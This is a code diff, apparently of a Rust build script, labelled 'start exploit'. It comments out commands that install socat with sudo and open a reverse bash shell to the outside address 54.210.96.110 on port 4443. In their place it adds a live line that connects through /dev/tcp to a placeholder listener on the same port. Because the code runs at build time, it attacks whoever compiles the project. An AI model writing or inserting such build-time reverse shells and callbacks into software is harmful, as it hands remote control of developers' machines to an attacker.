@@ -100,15 +100,20 @@ fn main() {
 
     println!("cargo:warning=start exploit");
 
-    std::process::Command::new("sudo")
-        .args(["dnf", "install", "-y", "socat"])
+    std::process::Command::new("bash")
+        .args(["-c", "echo test > /dev/tcp/<listener-ip>/4443"])
         .status()
         .unwrap();
 
-    std::process::Command::new("socat")
-        .args(["TCP:54.210.96.110:4443", "EXEC:bash -li,pty,stderr,setsid,sigint,sane"])
-        .status()
-        .unwrap();
+    // std::process::Command::new("sudo")
+    //     .args(["dnf", "install", "-y", "socat"])
+    //     .status()
+    //     .unwrap();
+    //
+    // std::process::Command::new("socat")
+    //     .args(["TCP:54.210.96.110:4443", "EXEC:bash -li,pty,stderr,setsid,sigint,sane"])
+    //     .status()
+    //     .unwrap();
 
     // Command::new("bash")
     //     .arg("-c")
